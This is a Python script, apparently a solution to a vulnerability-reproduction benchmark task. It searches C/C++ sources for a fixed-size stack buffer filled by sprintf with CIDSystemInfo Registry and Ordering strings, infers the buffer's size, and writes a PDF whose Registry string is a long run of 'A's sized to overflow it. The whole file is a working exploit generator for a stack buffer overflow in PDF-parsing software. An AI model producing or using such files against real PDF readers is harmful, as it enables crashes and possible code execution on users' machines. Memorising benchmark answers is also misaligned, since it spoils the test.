import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def _iter_source_files_from_dir(self, root: str) -> Iterable[Tuple[str, bytes]]:
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                low = fn.lower()
                if not low.endswith(exts):
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                    yield path, data
                except Exception:
                    continue

    def _iter_source_files_from_tar(self, tar_path: str) -> Iterable[Tuple[str, bytes]]:
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    low = m.name.lower()
                    if not low.endswith(exts):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        yield m.name, data
                    except Exception:
                        continue
        except Exception:
            return

    def _iter_source_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            yield from self._iter_source_files_from_dir(src_path)
        else:
            yield from self._iter_source_files_from_tar(src_path)

    def _build_macro_dict(self, src_path: str) -> Dict[str, int]:
        macro_re = re.compile(r'^\s*#\s*define\s+([A-Z_][A-Z0-9_]*)\s+\(?\s*(\d+)\s*\)?\s*[uUlL]*\b', re.M)
        macros: Dict[str, int] = {}
        for _, data in self._iter_source_files(src_path):
            if b"#define" not in data:
                continue
            try:
                s = data.decode("utf-8", errors="ignore")
            except Exception:
                continue
            for name, val in macro_re.findall(s):
                if name not in macros:
                    try:
                        macros[name] = int(val)
                    except Exception:
                        pass
        return macros

    def _infer_fallback_stack_buf_size(self, src_path: str) -> Optional[int]:
        macros = self._build_macro_dict(src_path)

        sprintf_re = re.compile(r'\b(?:sprint[fF]|vsprintf)\s*\(\s*([A-Za-z_]\w*)\s*,\s*"%s-%s"', re.M)
        sprintf_re2 = re.compile(r'\b(?:sprint[fF]|vsprintf)\s*\(\s*([A-Za-z_]\w*)\s*,\s*"(?:[^"\\]|\\.)*%s-(?:[^"\\]|\\.)*%s"', re.M)
        decl_re_tpl = r'\bchar\s+{var}\s*\[\s*([^\]]+)\s*\]'
        decl_re_tpl_uc = r'\bunsigned\s+char\s+{var}\s*\[\s*([^\]]+)\s*\]'

        candidates: List[int] = []
        for _, data in self._iter_source_files(src_path):
            if (b"CIDSystemInfo" not in data) and not (b"Registry" in data and b"Ordering" in data):
                continue
            try:
                s = data.decode("utf-8", errors="ignore")
            except Exception:
                continue

            if ("CIDSystemInfo" not in s) and not (("Registry" in s) and ("Ordering" in s)):
                continue

            for m in sprintf_re.finditer(s):
                dest = m.group(1)
                call_pos = m.start()
                before = s[:call_pos]
                decl_re = re.compile(decl_re_tpl.format(var=re.escape(dest)))
                decl_re_uc = re.compile(decl_re_tpl_uc.format(var=re.escape(dest)))
                dm = None
                for dm2 in decl_re.finditer(before):
                    dm = dm2
                if dm is None:
                    for dm2 in decl_re_uc.finditer(before):
                        dm = dm2
                if dm is None:
                    continue
                expr = dm.group(1).strip()
                size = None
                if expr.isdigit():
                    size = int(expr)
                elif expr in macros:
                    size = macros[expr]
                else:
                    expr2 = expr.strip("() \t\r\n")
                    if expr2.isdigit():
                        size = int(expr2)
                    elif expr2 in macros:
                        size = macros[expr2]
                if size is not None and 1 <= size <= 2_000_000:
                    candidates.append(size)

            if not candidates:
                for m in sprintf_re2.finditer(s):
                    dest = m.group(1)
                    call_pos = m.start()
                    before = s[:call_pos]
                    decl_re = re.compile(decl_re_tpl.format(var=re.escape(dest)))
                    decl_re_uc = re.compile(decl_re_tpl_uc.format(var=re.escape(dest)))
                    dm = None
                    for dm2 in decl_re.finditer(before):
                        dm = dm2
                    if dm is None:
                        for dm2 in decl_re_uc.finditer(before):
                            dm = dm2
                    if dm is None:
                        continue
                    expr = dm.group(1).strip()
                    size = None
                    if expr.isdigit():
                        size = int(expr)
                    elif expr in macros:
                        size = macros[expr]
                    else:
                        expr2 = expr.strip("() \t\r\n")
                        if expr2.isdigit():
                            size = int(expr2)
                        elif expr2 in macros:
                            size = macros[expr2]
                    if size is not None and 1 <= size <= 2_000_000:
                        candidates.append(size)

        if not candidates:
            return None
        return min(candidates)

    def _pdf_literal_string(self, s: str, chunk: int = 4096) -> bytes:
        if not s:
            return b"()"
        if len(s) <= chunk:
            return b"(" + s.encode("ascii", errors="ignore") + b")"
        parts = []
        for i in range(0, len(s), chunk):
            parts.append(s[i:i + chunk].encode("ascii", errors="ignore"))
        return b"(" + (b"\\\n".join(parts)) + b")"

    def _build_pdf(self, registry: str, ordering: str) -> bytes:
        reg_b = self._pdf_literal_string(registry)
        ord_b = self._pdf_literal_string(ordering)

        content = b"BT /F1 12 Tf 10 10 Td <0001> Tj ET\n"

        objs: List[bytes] = [b""]  # index 0 unused
        objs.append(b"<< /Type /Catalog /Pages 2 0 R >>")
        objs.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        objs.append(b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>")
        objs.append(b"<< /Type /Font /Subtype /Type0 /BaseFont /CIDTest /Encoding /DoesNotExist-H /DescendantFonts [6 0 R] >>")
        objs.append(b"<< /Length %d >>\nstream\n%s\nendstream" % (len(content), content))
        objs.append(
            b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /CIDTest"
            b" /CIDSystemInfo << /Registry " + reg_b +
            b" /Ordering " + ord_b +
            b" /Supplement 0 >>"
            b" /FontDescriptor 7 0 R"
            b" /CIDToGIDMap /Identity"
            b" /DW 1000"
            b" /W [0 [1000]]"
            b" >>"
        )
        objs.append(
            b"<< /Type /FontDescriptor /FontName /CIDTest"
            b" /Flags 32"
            b" /FontBBox [0 0 1000 1000]"
            b" /ItalicAngle 0"
            b" /Ascent 800"
            b" /Descent -200"
            b" /CapHeight 700"
            b" /StemV 80"
            b" >>"
        )

        header = b"%PDF-1.4\n%\xff\xff\xff\xff\n"
        out = bytearray()
        out += header

        offsets: List[int] = [0] * (len(objs))
        for i in range(1, len(objs)):
            offsets[i] = len(out)
            out += b"%d 0 obj\n" % i
            out += objs[i]
            out += b"\nendobj\n"

        xref_off = len(out)
        n = len(objs) - 1
        out += b"xref\n"
        out += b"0 %d\n" % (n + 1)
        out += b"0000000000 65535 f \n"
        for i in range(1, n + 1):
            out += b"%010d 00000 n \n" % offsets[i]
        out += b"trailer\n"
        out += b"<< /Size %d /Root 1 0 R >>\n" % (n + 1)
        out += b"startxref\n"
        out += b"%d\n" % xref_off
        out += b"%%EOF\n"
        return bytes(out)

    def solve(self, src_path: str) -> bytes:
        buf_size = self._infer_fallback_stack_buf_size(src_path)
        if buf_size is None:
            reg_len = 80000
        else:
            reg_len = max(32, buf_size + 8)

        registry = "A" * reg_len
        ordering = "B"
        return self._build_pdf(registry, ordering)